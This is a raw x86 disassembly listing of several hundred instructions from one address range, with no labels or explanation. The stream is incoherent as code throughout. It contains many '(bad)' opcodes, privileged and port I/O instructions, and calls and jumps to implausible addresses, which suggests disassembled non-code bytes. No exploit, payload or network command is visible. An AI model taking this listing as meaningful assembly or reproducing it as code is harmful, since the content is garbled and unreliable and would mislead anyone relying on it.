  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
